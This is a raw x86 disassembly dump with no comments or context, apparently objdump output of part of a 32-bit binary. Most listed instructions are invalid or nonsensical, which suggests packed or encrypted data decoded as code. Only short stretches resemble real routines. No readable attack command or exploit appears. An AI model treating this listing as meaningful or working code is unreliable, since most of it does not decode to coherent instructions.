  407b6a:	cmp    edx,DWORD PTR [ecx-0x6]
  407b6d:	xlat   BYTE PTR ds:[ebx]
  407b6e:	fild   DWORD PTR [esi+0x1646e265]
  407b74:	or     BYTE PTR [esi+eiz*4+0x62f3434],ch
  407b7b:	lock xchg esp,eax
  407b7d:	xchg   esi,eax
  407b7e:	mov    edi,DWORD PTR [esi-0xc6579b0]
  407b84:	jae    0x407b7f
  407b86:	jb     0x407bbe
  407b88:	push   eax
  407b89:	lock inc ebx
  407b8b:	nop
  407b8c:	pop    ecx
  407b8d:	mov    ecx,0x35902f23
  407b92:	ret    
  407b93:	pushf  
  407b94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b95:	repz (bad) 
  407b97:	in     al,dx
  407b98:	mov    bh,0x7
  407b9a:	push   cs
  407b9b:	inc    esi
  407b9c:	push   es
  407b9d:	sbb    DWORD PTR [ecx+edi*8],0xc24d2637
  407ba4:	test   ah,al
  407ba6:	retf   0x7fef
  407ba9:	rol    DWORD PTR [esi+ecx*2+0xbff6542],1
  407bb0:	or     DWORD PTR [ecx+0xe1f90c8],esi
  407bb6:	dec    esp
  407bb7:	xor    eax,0xc0ef9b69
  407bbc:	inc    ebp
  407bbd:	leave  
  407bbe:	push   ss
  407bbf:	mov    esp,DWORD PTR [esp+esi*4+0x7c]
  407bc3:	lock es dec edi
  407bc6:	and    al,BYTE PTR [eax]
  407bc8:	rcr    DWORD PTR [ecx-0x66b6a294],1
  407bce:	push   0x2c
  407bd0:	adc    al,0xaa
  407bd2:	mov    edi,DWORD PTR fs:[edi-0x67]
  407bd6:	add    al,BYTE PTR [edi-0x35]
  407bd9:	jecxz  0x407c4e
  407bdb:	mov    ds:0xbc682534,al
  407be0:	push   edx
  407be1:	rol    BYTE PTR [esi+0x52],cl
  407be4:	hlt    
  407be5:	mov    esp,0x28d9d9ec
  407bea:	pop    ds
  407beb:	mov    BYTE PTR [esi+0x7b4007f0],dh
  407bf1:	ja     0x407c21
  407bf3:	mov    ch,0x82
  407bf5:	pop    esi
  407bf6:	add    dl,ah
  407bf8:	cmp    bl,al
  407bfa:	add    edx,edi
  407bfc:	mov    al,0x5d
  407bfe:	popa   
  407bff:	popf   
  407c00:	aaa    
  407c01:	add    ecx,edx
  407c03:	dec    ebx
  407c04:	fild   DWORD PTR [edi+0x36]
  407c07:	xchg   esi,eax
  407c08:	xlat   BYTE PTR ds:[ebx]
  407c09:	call   0x33ad5b1
  407c0e:	push   edx
  407c0f:	and    edi,DWORD PTR [ecx-0x40e6f7e3]
  407c15:	int3   
  407c16:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c18:	dec    edi
  407c19:	fiadd  WORD PTR [ecx-0x3e]
  407c1c:	push   ebp
  407c1d:	sbb    eax,0x81470fb8
  407c22:	or     al,0xa7
  407c24:	loop   0x407bee
  407c26:	mov    eax,0xca62bb38
  407c2b:	xor    DWORD PTR ds:0x496a9523,ebx
  407c31:	sub    BYTE PTR ds:0x32192892,dh
  407c37:	ror    BYTE PTR [ecx],0x7e
  407c3a:	ret    0x26ab
  407c3d:	loop   0x407c36
  407c3f:	or     eax,0x2617535
  407c44:	or     BYTE PTR [eax-0x3c],bl
  407c47:	stc    
  407c48:	out    dx,eax
  407c49:	inc    esp
  407c4a:	(bad)  
  407c4c:	fwait
  407c4d:	inc    edx
  407c4e:	cmp    al,0xa0
  407c50:	popf   
  407c51:	or     eax,0x23d00560
  407c56:	aas    
  407c57:	pop    ebx
  407c58:	add    edx,DWORD PTR [esi+0x18]
  407c5b:	add    edx,DWORD PTR [esi]
  407c5d:	js     0x407c16
  407c5f:	xchg   edi,eax
  407c60:	inc    edx
  407c61:	sub    bh,ah
  407c63:	leavew 
  407c65:	sub    eax,0x6e725d03
  407c6a:	call   0x6e7c20b
  407c6f:	xchg   ebp,eax
  407c70:	dec    eax
  407c71:	mov    dh,0x49
  407c73:	(bad)  
  407c74:	out    dx,eax
  407c75:	into   
  407c76:	push   ebx
  407c77:	xchg   ecx,eax
  407c78:	or     BYTE PTR [eax+0x70],bh
  407c7b:	aas    
  407c7c:	(bad)  [ebp-0x61]
  407c7f:	mov    edx,0xbefcc06c
  407c84:	das    
  407c85:	add    eax,0x945f2352
  407c8a:	cmp    BYTE PTR [eax*1-0x2a4ca29a],dh
  407c91:	ja     0x407cfb
  407c93:	daa    
  407c94:	pop    ebp
  407c95:	daa    
  407c96:	sbb    DWORD PTR [edx],edx
  407c98:	pop    ds
  407c99:	lock mov esp,0xbcc5e3c2
  407c9f:	imul   ebp,DWORD PTR [esi-0x62518244],0x541ff902
  407ca9:	inc    eax
  407caa:	and    DWORD PTR [edi+0x7a],ebx
  407cad:	pop    esp
  407cae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407caf:	jo     0x407cb5
  407cb1:	(bad)  
  407cb3:	cmp    ch,BYTE PTR ds:0x8ea7c847
  407cb9:	jmp    0x21d3:0x74c304e0
  407cc0:	fucomp st(7)
  407cc2:	jge    0x407c54
  407cc4:	push   es
  407cc5:	lahf   
  407cc6:	imul   edx,DWORD PTR [esi+0x46],0x20
  407cca:	aad    0x6f
  407ccc:	sub    BYTE PTR [edx],ah
  407cce:	pop    esi
  407ccf:	or     al,0xa0
  407cd1:	add    al,0x59
  407cd3:	repz es dec esp
  407cd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cd7:	xchg   edi,eax
  407cd8:	adc    al,0xb9
  407cda:	xchg   ebx,eax
  407cdb:	xor    esi,DWORD PTR [ecx]
  407cdd:	cmp    eax,0x3f17eea8
  407ce2:	leave  
  407ce3:	adc    BYTE PTR [edx],dh
  407ce5:	add    edi,DWORD PTR [edi+0x10a92af3]
  407ceb:	add    eax,0xaebfda72
  407cf0:	push   edx
  407cf1:	retf   
  407cf2:	rcr    BYTE PTR [eax-0x214736b9],0x15
  407cf9:	mov    edi,0x9be4e0ad
  407cfe:	ds pop ebx
  407d00:	int    0x3c
  407d02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d03:	mov    bl,0x6a
  407d05:	inc    ebx
  407d06:	and    al,0xb0
  407d08:	mov    eax,0x9a028e7d
  407d0d:	ins    BYTE PTR es:[edi],dx
  407d0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d0f:	scas   al,BYTE PTR es:[edi]
  407d10:	hlt    
  407d11:	clc    
  407d12:	gs aam 0x54
  407d15:	loopne 0x407cc8
  407d17:	sahf   
  407d18:	outs   dx,BYTE PTR ds:[esi]
  407d19:	mov    gs,WORD PTR ds:0x40421bb2
  407d1f:	lock lods eax,DWORD PTR ds:[esi]
  407d21:	push   esp
  407d22:	adc    BYTE PTR [esi],dl
  407d24:	cmp    al,0xe3
  407d26:	int    0x14
  407d28:	mov    ah,dh
  407d2a:	adc    DWORD PTR ds:0x4caea9f4,edi
  407d30:	ds aam 0x46
  407d33:	mov    DWORD PTR [ebp-0x4],edx
  407d36:	mov    DWORD PTR [ebp-0x30],0xba699573
  407d3d:	sbb    DWORD PTR ds:0x422982,edx
  407d43:	mov    eax,0x9c0a89d8
  407d48:	or     edx,0x5666
  407d4e:	mov    DWORD PTR [ebp-0x2c],eax
  407d51:	sub    DWORD PTR ds:0x422996,ebx
  407d57:	mov    DWORD PTR [ebp-0x20],0xba699577
  407d5e:	and    DWORD PTR ds:0x42294a,ecx
  407d64:	mov    DWORD PTR [ebp-0x1c],eax
  407d67:	mov    DWORD PTR [ebp-0x10],0xba69957b
  407d6e:	mov    DWORD PTR [ebp-0xc],eax
  407d71:	mov    DWORD PTR [ebp-0x60],0xba69957f
  407d78:	add    edx,0x428b
  407d7e:	mov    DWORD PTR [ebp-0x5c],eax
  407d81:	sbb    DWORD PTR ds:0x42289a,0x1b7d
  407d8b:	mov    eax,DWORD PTR [ebp-0x30]
  407d8e:	xor    DWORD PTR ds:0x42299a,0x1f10
  407d98:	jmp    0x408322
  407d9d:	mov    ch,0x6c
  407d9f:	or     eax,0x997014f1
  407da4:	sbb    BYTE PTR [edx-0x169133e9],bh
  407daa:	in     al,0x38
  407dac:	push   0x1616611c
  407db1:	cmp    eax,0x8a161604
  407db6:	jp     0x407e1f
  407db8:	push   ds
  407db9:	bound  esi,QWORD PTR [edx+0xa]
  407dbc:	mov    edx,0x7e0a44fe
  407dc1:	xor    ah,BYTE PTR [edi]
  407dc3:	lahf   
  407dc4:	lods   eax,DWORD PTR ds:[esi]
  407dc5:	aam    0x32
  407dc7:	repnz lea ebp,[ecx+0x5434d299]
  407dce:	sub    eax,0x2ba3b3e5
  407dd3:	cmp    DWORD PTR [ecx+edi*2],0x58
  407dd7:	sub    DWORD PTR [ebx+0x1af020d1],0x56
  407dde:	xor    eax,eax
  407de0:	retf   
  407de1:	sub    BYTE PTR [edi-0x5cea40de],dl
  407de7:	pop    esp
  407de8:	add    BYTE PTR [edx],ch
  407dea:	fdiv   DWORD PTR [eax+ecx*1+0x5dba73e2]
  407df1:	xor    eax,0xaf707ba2
  407df6:	or     al,BYTE PTR [ebp+0x370eae34]
  407dfc:	sar    edx,1
  407dfe:	sbb    bl,al
  407e00:	(bad)  
  407e01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e02:	sub    dh,bh
  407e04:	cmp    ch,ah
  407e06:	adc    ecx,DWORD PTR [eax+0x45]
  407e09:	arpl   WORD PTR [esi+edx*4],bp
  407e0c:	sub    al,0xa6
  407e0e:	lea    esp,[ecx-0x5029fc2c]
  407e14:	shr    ebx,0x57
  407e17:	stos   BYTE PTR es:[edi],al
  407e18:	out    0xa5,eax
  407e1a:	jl     0x407deb
  407e1c:	addr16 mov ah,0x2d
  407e1f:	cmc    
  407e20:	imul   eax,DWORD PTR [ebp+0x61d5db5f],0x6d
  407e27:	adc    bl,BYTE PTR [eax-0x2f0cbb4]
  407e2d:	jmp    0x803:0x86de04cf
  407e34:	push   eax
  407e35:	cli    
  407e36:	or     eax,0xd98f22ad
  407e3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e3c:	sub    cl,BYTE PTR [edi+edx*4+0x42be53ca]
  407e43:	sub    edi,ecx
  407e45:	ds sti 
  407e47:	mul    DWORD PTR [edx+0x38]
  407e4a:	gs mov dl,0x14
  407e4d:	imul   eax,DWORD PTR [eax+0x27],0x38
  407e51:	leave  
  407e52:	jmp    0x407e15
  407e54:	mov    ebx,DWORD PTR [edi+0x3f]
  407e57:	cdq    
  407e58:	sub    edi,DWORD PTR [esi+0x58]
  407e5b:	add    eax,DWORD PTR [ecx-0x1c]
  407e5e:	cmp    BYTE PTR [ecx+0x7d12f10a],ch
  407e64:	inc    eax
  407e65:	and    eax,0x42398175
  407e6a:	(bad)  
  407e6b:	or     edx,eax
  407e6d:	popf   
  407e6e:	leave  
  407e6f:	mov    ds:0xb9af6eed,eax
  407e74:	std    
  407e75:	lods   eax,DWORD PTR ds:[esi]
  407e76:	sbb    ch,BYTE PTR [esi-0x1b]
  407e79:	sti    
  407e7a:	xchg   BYTE PTR [esi-0x5d],ch
  407e7d:	adc    edx,esp
  407e7f:	push   ss
  407e80:	xchg   esi,eax
  407e81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e82:	jmp    0x407e83
  407e84:	iret   
  407e85:	(bad)  
  407e86:	ins    BYTE PTR es:[edi],dx
  407e87:	push   ecx
  407e88:	aas    
  407e89:	cmc    
  407e8a:	call   0x4d9914ee
  407e8f:	adc    ebx,DWORD PTR [edx-0x70]
  407e92:	cmp    al,0x7c
  407e94:	loopne 0x407e63
  407e96:	fsub   st(6),st
  407e98:	dec    eax
  407e9a:	dec    edx
  407e9b:	inc    esp
  407e9c:	fisttp WORD PTR [edx+0x70dc5986]
  407ea2:	mov    es,WORD PTR [edx]
  407ea4:	aaa    
  407ea5:	cmp    BYTE PTR [edi+ebp*1],bh
  407ea8:	dec    edx
  407ea9:	xchg   esi,eax
  407eaa:	fs scas eax,DWORD PTR es:[edi]
  407eac:	cs icebp 
  407eae:	aam    0x92
  407eb0:	pop    esi
  407eb1:	shl    BYTE PTR [edx+0x382cadeb],1
  407eb7:	xor    BYTE PTR [ecx+0x15],dh
  407eba:	outs   dx,BYTE PTR ds:[esi]
  407ebb:	add    dh,dh
  407ebd:	repnz (bad) 
  407ebf:	jmp    0xd919:0x7ad9b6d3
  407ec6:	mov    esp,0x19e2f116
  407ecb:	jmp    0x75775640
  407ed0:	mov    bl,0x27
  407ed2:	xor    ebx,DWORD PTR [eax]
  407ed4:	mov    esi,0x8bcc6f2
  407ed9:	inc    ebx
  407eda:	or     BYTE PTR ss:[ebx],dh
  407edd:	aam    0x8b
  407edf:	xor    BYTE PTR [ebx+eax*4+0x44],0x6e
  407ee4:	(bad)  
  407ee5:	nop
  407ee6:	clc    
  407ee7:	mov    eax,0x72e24baf
  407eec:	std    
  407eed:	sbb    ebp,DWORD PTR [edi-0x69]
  407ef0:	aaa    
  407ef1:	bound  ebp,QWORD PTR [ebp-0x39]
  407ef4:	add    al,0xc8
  407ef6:	fs nop
  407ef8:	call   0x2dddcfc9
  407efd:	dec    eax
  407efe:	ds jg  0x407f37
  407f01:	mov    eax,0x3ab74179
  407f06:	push   es
  407f07:	push   0xffffff8e
  407f09:	inc    ebx
  407f0a:	das    
  407f0b:	(bad)  
  407f0c:	jmp    0x7a9dd4ab
  407f11:	fnstsw WORD PTR [ebp+0x61]
  407f14:	lods   al,BYTE PTR ds:[esi]
  407f15:	xor    BYTE PTR [esi+0x2b],bl
  407f18:	push   eax
  407f19:	mov    ch,BYTE PTR [ebx-0x624b6943]
  407f1f:	sbb    ah,BYTE PTR [edi]
  407f21:	pop    esp
  407f22:	and    DWORD PTR [esi-0x51],0xbf17f17b
  407f29:	add    eax,0x86b95a71
  407f2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f2f:	adc    BYTE PTR [edx+ebx*1],bh
  407f32:	retf   
  407f33:	inc    edi
  407f34:	cld    
  407f35:	je     0x407ec0
  407f37:	in     eax,dx
  407f38:	mov    cl,0x26
  407f3a:	xor    al,0xa4
  407f3c:	add    eax,0x5a8c58c0
  407f41:	fdecstp 
  407f43:	push   edx
  407f44:	mov    ah,0xa
  407f46:	dec    esp
  407f47:	pusha  
  407f48:	neg    BYTE PTR [ebx-0x6e80e59f]
  407f4e:	ror    DWORD PTR [esi+0x2e],1
  407f51:	jo     0x407f2a
  407f53:	add    BYTE PTR [eax],ah
  407f55:	add    eax,0x27533ba8
  407f5a:	loopne 0x407f3e
  407f5c:	imul   eax,DWORD PTR [ebx+0x0]
  407f60:	icebp  
  407f61:	in     al,0x27
  407f63:	out    dx,eax
  407f64:	inc    ebx
  407f65:	push   ebx
  407f66:	addr16 mov edi,0x42705771
  407f6c:	lahf   
  407f6d:	jne    0x407f3b
  407f6f:	ins    BYTE PTR es:[edi],dx
  407f70:	into   
  407f71:	frstor [ebx]
  407f73:	fs push ss
  407f75:	mov    dh,0x51
  407f77:	cli    
  407f78:	retf   0xfd25
  407f7b:	or     BYTE PTR [edx+ecx*2],bh
  407f7e:	sbb    eax,0x14489e31
  407f83:	jecxz  0x407f40
  407f85:	or     eax,0x2272845f
  407f8a:	aad    0xfa
  407f8c:	push   ecx
  407f8d:	inc    esp
  407f8e:	mov    ebx,0x27afcec0
  407f93:	cld    
  407f94:	mov    cl,0xb1
  407f96:	jns    0x407fd1
  407f98:	inc    eax
  407f99:	stos   DWORD PTR es:[edi],eax
  407f9a:	mov    edx,0xad0ed860
  407f9f:	jmp    0x49e2:0x6f1096cc
  407fa6:	(bad)  
  407fa7:	jmp    DWORD PTR [esp+ebx*1+0x6f429865]
  407fae:	jmp    0x6712298b
  407fb3:	add    al,0x7a
  407fb5:	addr16 (bad) 
  407fb8:	dec    eax
  407fb9:	ja     0x407f9b
  407fbb:	test   DWORD PTR [ebp+0x3],ebp
  407fbe:	mov    edx,0xb136dd31
  407fc3:	test   eax,0xb5e7ad5c
  407fc8:	inc    edi
  407fc9:	out    dx,eax
  407fca:	popa   
  407fcb:	test   al,0x44
  407fcd:	mov    ds:0xfaa1742,eax
  407fd2:	outs   dx,DWORD PTR ds:[esi]
  407fd3:	fdivr  DWORD PTR [edx+0x53c6dbf6]
  407fd9:	pop    edi
  407fda:	push   esp
  407fdb:	pop    ds
  407fdc:	cs mov dl,0xcd
  407fdf:	lods   al,BYTE PTR ds:[esi]
  407fe0:	mov    eax,ds:0xd6b6da62
  407fe5:	cmp    eax,0xf83691e0
  407fea:	lds    esp,FWORD PTR [edi-0x2b]
  407fed:	xor    ah,ah
  407fef:	mov    dh,0x89
  407ff1:	or     bl,BYTE PTR [eax]
  407ff3:	out    dx,al
  407ff4:	fnstcw WORD PTR [eax]
  407ff6:	jbe    0x408077
  407ff8:	or     al,0x37
  407ffa:	outs   dx,BYTE PTR ds:[esi]
  407ffb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ffc:	shl    DWORD PTR [eax],cl
  407ffe:	aam    0x72
  408000:	xor    eax,0x98267f09
  408005:	jge    0x407f91
  408007:	lods   al,BYTE PTR ds:[esi]
  408008:	in     eax,dx
  408009:	test   eax,0x813c0dcd
  40800e:	dec    ebx
  40800f:	leave  
  408010:	mov    ds:0xe985f61c,eax
  408015:	jmp    0x407fbe
  408017:	dec    ecx
  408018:	adc    BYTE PTR [ebp-0x4d],dh
  40801b:	push   ecx
  40801c:	dec    edi
  40801d:	xchg   esi,eax
  40801e:	and    eax,DWORD PTR [eax]
  408020:	ins    DWORD PTR es:[edi],dx
  408021:	mov    edi,0x4ed8578d
  408026:	les    eax,FWORD PTR [ebx]
  408028:	mov    cl,0x1c
  40802a:	aaa    
  40802b:	aas    
  40802c:	inc    ebx
  40802d:	lea    esi,[ecx]
  40802f:	push   ds
  408030:	cli    
  408031:	push   0x1afd1a71
  408036:	inc    eax
  408037:	aad    0x43
  408039:	add    eax,0x60ec7258
  40803e:	icebp  
  40803f:	push   es
  408040:	icebp  
  408041:	fidivr DWORD PTR [edx+0x73dc4efe]
  408047:	or     dl,BYTE PTR [esp+ebx*8+0x10b50ff9]
  40804e:	and    eax,0x523e9ba9
  408053:	lea    esi,[esp+eiz*4-0x7b]
  408057:	test   eax,0xee393e26
  40805c:	mov    edi,0xc6570a89
  408061:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408062:	nop
  408063:	push   edi
  408064:	das    
  408065:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408066:	imul   esi,edi,0xb14ea33f
  40806c:	sbb    al,0x7
  40806e:	jmp    0x4080ab
  408070:	scas   eax,DWORD PTR es:[edi]
  408071:	mov    dl,0x8b
  408073:	stos   BYTE PTR es:[edi],al
  408074:	add    eax,DWORD PTR [edx-0x7eccc157]
  40807a:	inc    esi
  40807b:	call   0x4b191111
  408080:	xor    al,0xcc
  408082:	jb     0x4080a1
  408084:	repz (bad) 
  408086:	call   0xabdd:0x2c4b1c9d
  40808d:	jno    0x408035
  40808f:	push   0xcc282adb
  408094:	das    
  408095:	iret   
  408096:	xor    DWORD PTR gs:[ecx+0x3f562e38],edi
  40809d:	imul   esp,DWORD PTR [ebp-0x25],0x56
  4080a1:	push   edi
  4080a2:	dec    ebx
  4080a3:	dec    ebx
  4080a4:	les    edx,FWORD PTR [esi+0x50]
  4080a7:	xor    BYTE PTR [edx-0x6d865af3],cl
  4080ad:	push   ss
  4080ae:	mov    ecx,0x178d80e0
  4080b3:	inc    eax
  4080b4:	or     BYTE PTR [esi],dh
  4080b6:	push   ss
  4080b7:	push   cs
  4080b8:	ret    
  4080b9:	out    dx,eax
  4080ba:	push   eax
  4080bb:	push   ebx
  4080bc:	inc    edi
  4080be:	jno    0x40810a
  4080c0:	push   ds
  4080c1:	iret   
  4080c2:	mov    esi,DWORD PTR [ebp+0x3a]
  4080c5:	call   0xae95:0x3edb695d
  4080cc:	and    al,0xdc
  4080ce:	std    
  4080cf:	jnp    0x408086
  4080d1:	cmp    BYTE PTR [edx+0x46],dl
  4080d4:	icebp  
  4080d5:	mov    cl,0xe8
  4080d7:	fs andps xmm5,xmm7
  4080db:	dec    esp
  4080dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080dd:	inc    esp
  4080de:	stc    
  4080df:	pop    es
  4080e0:	and    eax,edi
  4080e2:	adc    esi,eax
  4080e4:	add    cl,BYTE PTR [eax]
  4080e6:	sbb    al,0xbb
  4080e8:	jmp    0xa0fb:0x842abe1f
  4080ef:	xchg   ecx,eax
  4080f0:	lock pusha 
  4080f2:	pusha  
  4080f3:	xchg   ebx,eax
  4080f4:	add    eax,0x85590524
  4080f9:	xor    al,0x43
  4080fb:	in     eax,0x13
  4080fd:	mov    ch,0x50
  4080ff:	stc    
  408100:	mov    ds:0xab309e33,al
  408105:	mov    bh,0x7
  408107:	dec    edx
  408108:	sbb    ebp,DWORD PTR [edi+0x4]
  40810b:	jl     0x40815b
  40810d:	test   al,0x7b
  40810f:	sub    eax,0xc9de9457
  408114:	in     al,dx
  408115:	addr16 mov al,ds:0x85f3
  408119:	fidiv  WORD PTR [ebx-0xa]
  40811c:	sub    al,0x1e
  40811e:	inc    esp
  40811f:	jecxz  0x408123
  408121:	jl     0x408131
  408123:	pop    edi
  408124:	lahf   
  408125:	and    bh,bl
  408127:	and    DWORD PTR [ebx+ebx*1+0x7c],0xf2b62b70
  40812f:	aas    
  408130:	xchg   ebx,eax
  408131:	jp     0x40819d
  408133:	dec    edi
  408134:	cwde   
  408135:	jg     0x408116
  408137:	dec    ebx
  408138:	push   es
  408139:	and    DWORD PTR [eax-0x6a3c1856],eax
  40813f:	adc    DWORD PTR [ecx+edx*8-0x5],esi
  408143:	cmp    al,0xb9
  408145:	jae    0x4081b1
  408147:	(bad)  
  408148:	hlt    
  408149:	mov    edi,0x94e23365
  40814e:	(bad)  [esi-0xd]
  408151:	fistp  DWORD PTR [ebx]
  408153:	mov    ds:0x77899f71,al
  408158:	mov    ebx,DWORD PTR [ebp+0x42]
  40815b:	cld    
  40815c:	mov    ecx,edx
  40815e:	sub    DWORD PTR es:[edx-0x3af10cfc],edi
  408165:	adc    al,0x1f
  408167:	push   ss
  408168:	adc    eax,0x679962cb
  40816d:	push   eax
  40816e:	(bad)  [eax+eiz*4+0x6f19b5b3]
  408175:	xchg   edi,eax
  408176:	cwde   
  408177:	lods   al,BYTE PTR ds:[esi]
  408178:	sub    BYTE PTR [esi],ch
  40817a:	adc    al,0x69
  40817c:	(bad)  
  40817d:	stos   BYTE PTR es:[edi],al
  40817e:	clc    
  40817f:	jmp    0x52d1a4fb
  408184:	dec    ecx
  408185:	pop    edi
  408186:	or     bl,cl
  408188:	outs   dx,BYTE PTR ds:[esi]
  408189:	sar    DWORD PTR [ebx+0x79e85e95],1
  40818f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408190:	ja     0x408180
  408192:	std    
  408193:	xor    ebx,eax
  408195:	mov    ds:0x82caacae,eax
  40819a:	stos   DWORD PTR es:[edi],eax
  40819b:	test   ebp,eax
  40819d:	lahf   
  40819e:	jmp    0x3a21f485
  4081a3:	ret    
  4081a4:	pushf  
  4081a5:	in     al,dx
  4081a6:	mov    ds:0x9a065968,al
  4081ab:	cdq    
  4081ac:	add    edx,esi
  4081ae:	test   al,0x82
  4081b0:	dec    ebx
  4081b1:	aam    0x84
  4081b3:	cmp    eax,0x59705504
  4081b8:	and    al,0xfa
  4081ba:	(bad)  
  4081bb:	cs adc eax,0xcbfc04e8
  4081c1:	iret   
  4081c2:	cmp    DWORD PTR [ebx],edx
  4081c4:	cmp    DWORD PTR [ecx-0x56f54e1],eax
  4081ca:	nop
  4081cb:	mov    DWORD PTR [edx+0x485f8dfa],ecx
  4081d1:	push   0xa6d5725a
  4081d6:	adc    BYTE PTR [esi+0x6e2b77d2],0x49
  4081dd:	scas   al,BYTE PTR es:[edi]
  4081de:	(bad)  
  4081df:	jbe    0x4081b4
  4081e1:	mov    edx,0x2584d386
  4081e6:	pop    ss
  4081e7:	hlt    
  4081e8:	(bad)  
  4081e9:	mov    ebx,0xe39140be
  4081ee:	xor    al,0xf7
  4081f0:	xor    BYTE PTR [eax+0x540b3e6f],al
  4081f6:	sbb    BYTE PTR [eax-0x2cecbe59],al
  4081fc:	ja     0x408189
  4081fe:	sbb    BYTE PTR fs:[esi+0x57],0x2
  408203:	in     eax,dx
  408204:	fbld   TBYTE PTR [esi+0x70]
  408207:	jmp    0x161c97f7
  40820c:	dec    ebx
  40820d:	mov    edx,0x71e147bf
  408212:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408213:	aaa    
  408214:	inc    esp
  408215:	ficom  WORD PTR [edi]
  408217:	jg     0x4081dc
  408219:	jno    0x408217
  40821b:	leave  
  40821c:	das    
  40821d:	shr    ebx,0x8c
  408220:	je     0x408292
  408222:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408223:	push   ebp
  408224:	jns    0x408295
  408226:	jmp    0x4334273f
  40822b:	rol    bl,0x83
  40822e:	push   ss
  40822f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408230:	gs pop esi
  408232:	push   cs
  408233:	xchg   edi,eax
  408234:	jae    0x4081d1
  408236:	data16 add BYTE PTR [ecx-0x53],0x18
  40823b:	aad    0xb7
  40823d:	inc    ebx
  40823e:	mov    bh,0xa3
  408240:	and    al,0x77
  408242:	imul   ecx,DWORD PTR [ebx],0xffd8e3d8
  408248:	sar    eax,0x16
  40824b:	and    ch,BYTE PTR [ecx]
  40824d:	adc    bl,bl
  40824f:	push   0x74e1c8d0
  408254:	mov    bl,bl
  408256:	xchg   ebp,eax
  408257:	and    DWORD PTR [esi+esi*2],edi
  40825a:	jnp    0x4081fa
  40825c:	int3   
  40825d:	(bad)  
  40825e:	aad    0x7
  408260:	jmp    0x4082ca
  408262:	call   0x6091:0xd22bd6df
  408269:	sub    BYTE PTR [edi],dh
  40826b:	in     eax,0x6
  40826d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40826e:	add    al,0xf3
  408270:	inc    edx
  408271:	call   0x3039:0x3e30f450
  408278:	push   esp
  408279:	into   
  40827a:	or     DWORD PTR [ebp+0x3a],ebp
  40827d:	not    DWORD PTR [edx+0x6f]
  408280:	mov    esi,0x6754f509
  408285:	nop
  408286:	jne    0x408250
  408288:	xlat   BYTE PTR ds:[ebx]
  408289:	mov    al,0xf4
  40828b:	xor    BYTE PTR [edx-0x22],dl
  40828e:	xchg   ecx,eax
  40828f:	adc    BYTE PTR [eax],0x22
  408292:	inc    edx
  408293:	cmp    ah,bh
  408295:	xor    ecx,ebp
  408297:	and    DWORD PTR [ecx-0x54],esi
  40829a:	pop    eax
  40829b:	aam    0xa
  40829d:	sub    bl,dl
  40829f:	out    0x77,eax
  4082a1:	sub    dh,BYTE PTR [ebx+0x42]
  4082a4:	cdq    
  4082a5:	mov    ah,0x9c
  4082a7:	jg     0x408281
  4082a9:	and    cl,0x4e
  4082ac:	scas   eax,DWORD PTR es:[edi]
  4082ad:	adc    eax,0xa0f23da8
  4082b2:	add    eax,0xf43602a7
  4082b7:	das    
  4082b8:	push   0xffffffaa
  4082ba:	xchg   BYTE PTR [eax+0x58],dh
  4082bd:	pop    ebx
  4082be:	mov    BYTE PTR [esi],ch
  4082c0:	jg     0x408262
  4082c2:	pop    sp
  4082c4:	ja     0x4082c9
  4082c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082c7:	ins    BYTE PTR es:[edi],dx
  4082c8:	lahf   
  4082c9:	rcl    BYTE PTR [esi-0x17e09cb7],0x97
  4082d0:	aaa    
  4082d1:	rcl    BYTE PTR [eax+0x7d],1
  4082d4:	xchg   edi,eax
  4082d5:	dec    edx
  4082d6:	inc    esp
  4082d7:	sub    eax,DWORD PTR [edx]
  4082d9:	push   cx
  4082db:	call   0xb9910bfb
  4082e0:	nop    edx
  4082e3:	mov    cl,0xac
  4082e5:	inc    edx
  4082e6:	pop    esi
  4082e7:	mov    edi,0x9e6af1cc
  4082ec:	fist   WORD PTR [edx+0x11cd644a]
  4082f2:	pop    ebx
  4082f3:	inc    eax
  4082f4:	pop    edi
  4082f5:	push   ds
  4082f6:	int    0x30
  4082f8:	sti    
  4082f9:	stc    
  4082fa:	push   esi
  4082fb:	loop   0x408283
  4082fd:	mov    al,ds:0x90d29e55
  408302:	repnz and DWORD PTR [eax+0x1c288cd5],esp
  408309:	jne    0x408309
  40830b:	push   ss
  40830c:	packsswb mm1,mm0
  40830f:	push   ebx
  408310:	out    0xdc,eax
  408312:	mov    ch,0xc7
  408314:	pop    ecx
  408315:	add    BYTE PTR [edx+eiz*4+0x2a7123e3],al
  40831c:	test   DWORD PTR [edx],edi
  40831e:	mov    esp,DWORD PTR [esp+eiz*2+0x6e]
  408322:	mov    ecx,DWORD PTR [ebp-0x2c]
  408325:	shrd   eax,ecx,0x2
  408329:	cmp    DWORD PTR ds:0x422946,0x0
  408330:	movzx  edx,WORD PTR ds:0x4228f2
  408337:	mov    DWORD PTR ds:0x42291a,0x73f0
  408341:	mov    DWORD PTR ds:0x4228a6,0x5bc0
  40834b:	mov    DWORD PTR ds:0x4228a6,edi
  408351:	jmp    0x4083c2
  408356:	mov    DWORD PTR ds:0x422966,0x16dc
  408360:	ja     0x40839a
  408366:	push   0x7c34
  40836b:	push   0x2548
  408370:	push   0x422922
  408375:	push   0x4229d2
  40837a:	call   DWORD PTR ds:0x42a04c
  408380:	adc    DWORD PTR ds:0x4229b2,ebx
  408386:	or     DWORD PTR ds:0x422956,0x2706
  408390:	mov    DWORD PTR ds:0x42293e,0x85d
